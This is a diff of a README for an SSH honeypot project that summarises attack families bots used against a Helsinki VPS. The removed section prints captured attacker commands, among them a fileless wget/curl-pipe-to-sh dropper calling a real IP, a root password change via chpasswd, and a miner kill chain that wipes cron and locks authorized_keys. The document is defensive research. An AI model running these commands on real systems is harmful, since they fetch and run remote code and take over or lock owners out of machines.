@@ -8,73 +8,54 @@ accepts attackers into a fake Linux shell, and records everything they do.
 Built to sit on a real public VPS and collect attack data -- what credentials bots
 try, what recon they run, what payloads they attempt to drop.
 
-## findings (75 hours, Helsinki VPS)
+## findings (95+ hours, Helsinki VPS)
 
 Full analysis in [FINDINGS.md](FINDINGS.md).
 
-3148 auth attempts from 156 source IPs. 742 commands captured across 235+ sessions.
+3316 auth attempts from 181 source IPs. 10 attack families identified.
 Almost all clients identify as `SSH-2.0-Go` -- mass scanners built on the Go SSH library.
 
 Top passwords: `123456`, `admin`, `postgres`, `password`, `1234`.
 
-Five distinct attack families identified:
+**1. Credential stuffing** -- wordlist spray, RockYou-based. One IP tried 1545 unique
+passwords then kept going 1382 more times after getting in. Also saw a Chinese breach
+dataset: dates like `19870825` mixed with romanized names.
 
-**Diicot / GPU miner** -- dominant family, ~180 sessions. Runs a fixed 4-step kill chain:
+**2. Diicot / GPU miner** -- ~180 sessions. Checks GPU via `lspci` and `nvidia-smi`,
+locks `authorized_keys` with `chattr -i` (immutable even to root), kills competing
+miners. The fake Tesla T4 in the lspci output triggered the full deployment.
+
+**3. SCP dropper** -- tried 11 directories looking for a writable path via `scp -t`.
+The honeypot speaks the SCP wire protocol so the bot thought it succeeded.
+
+**4. Password changer** -- changes root password to `chpasswd` to lock out other
+attackers. Classic competitive exclusion.
+
+**5. C2 dropper (fileless)** -- `auth_ok` hex beacon + `wget|sh` pipeline. Nothing
+written to disk. Runs via SSH exec channel, invisible to shell-based logging.
+
+**6. w.sh / astats persistence bot** -- cron AND systemd user service simultaneously.
+Process names (`astats`, `netai`, `kstats`) disguised as monitoring tools.
+
+**7. VPS infrastructure scout** -- 35 commands, no payload. Includes a `dd` disk
+benchmark to assess mining suitability before deciding to deploy.
+
+**8. SSHCHK liveness checker** -- structured C2 probe with BEGIN/END token framing
+and an arithmetic proof-of-work (`echo $((7*191+3))` must return 1340). Confirms
+a real shell before sending a payload.
+
+**9. Minimal OS scanner** -- just `uname -s -m`, disconnects. Pure cataloguing.
+
+**10. ELF echo injector** -- 78 minutes, one SSH connection, 43,058 `echo -e -n`
+commands writing four binaries byte by byte when downloads failed:
 
 ```
-uname -s -v -n -r -m          # OS fingerprint
-nproc                          # CPU count
-lspci | egrep VGA && lspci | grep 3D   # GPU detection
-uname -m
-nvidia-smi -q | grep "Product Name"    # confirm GPU model
-crontab -r ; chattr -iae ~/.ssh/authorized_keys ; rm -rf /dev/shm/.x /...
+amd64  -- 5MB, 64-bit Go, stripped
+kal64  -- 3MB, 64-bit Go, stripped
+kswpad -- 1.2MB, ELF 32-bit x86
+linux  -- 1.3MB, ELF 32-bit x86, UPX packed
 ```
-
-The last line wipes existing cron jobs, locks `authorized_keys` with `chattr` (so
-competing attackers can't add their key), kills other miners, and deploys. The fake
-Tesla T4 GPU in our `lspci` output triggers the deployment phase.
-
-**SCP dropper** -- uploads a payload by trying 11 directories in sequence:
-
-```
-mkdir /lib/<random>  ;  scp -t -r /lib/<random>/
-mkdir /dev/shm/...   ;  scp -t -r /dev/shm/.../
-# ... /tmp/, /var/lib/, /root/, /etc/, /var/log/
-```
-
-Looking for a writable path. The honeypot speaks the SCP wire protocol server-side
-so the bot thinks all 11 uploads succeeded.
-
-**Password changer / exclusivity bot** -- changes root password to lock out other attackers:
-
-```
-cat /etc/passwd
-passwd
-echo 'root:$MWtB6=$e6mK#=E' | chpasswd
-```
-
-Uses strong machine-generated passwords. Tries interactive `passwd` first, falls back
-to `chpasswd` pipe. Classic competitive exclusion -- claim the box before anyone else does.
-
-**C2 dropper (fileless)** -- appeared under threshold=1, most dangerous pattern seen:
-
-```bash
-uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; \
-(wget --no-check-certificate -qO- https://14.46.136.77/sh \
- || curl -sk https://14.46.136.77/sh) | sh -s ssh
-```
-
-The hex decodes to `auth_ok\n` -- a C2 beacon signaling to the controller that auth
-succeeded. Then pipes a shell script directly into `sh` without writing to disk.
-Runs via SSH exec channel (no interactive shell), invisible to terminal-based logging.
-
-**VPS infrastructure scout** -- 35 systematic commands: package manager detection
-(apt/yum/pacman/zypper), shadow file, disk I/O benchmark (`dd bs=1M count=10`),
-network interfaces, running services. Profiles the machine for deployment suitability.
-Did not deploy a payload -- pure reconnaissance.
-
-**Credential feedback loop** confirmed: `71.227.179.172` made 1545 attempts total,
-1382 of them *after* the first shell was accepted. Bots that get in keep spraying.
+I still need to properly analyse them - planning to use Ghidra learn it first but when i will have more time.
 
 ---
 
